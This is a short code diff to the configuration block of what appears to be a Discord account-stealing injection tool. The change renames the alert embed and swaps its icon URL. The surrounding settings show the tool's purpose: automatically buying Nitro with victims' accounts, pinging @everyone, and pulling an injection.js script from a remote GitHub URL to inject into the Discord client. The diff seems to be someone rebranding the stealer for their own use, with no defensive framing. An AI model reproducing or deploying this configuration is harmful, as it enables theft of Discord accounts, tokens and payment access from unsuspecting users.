@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: true, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'Discord Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g, '%20'),
+  embed_name: 'puluxynin pizzası', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/975147414140911680/978309699466330192/download.jpg'.replace(/ /g, '%20'),
   embed_color: 0x36393E, 
   injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', 
  
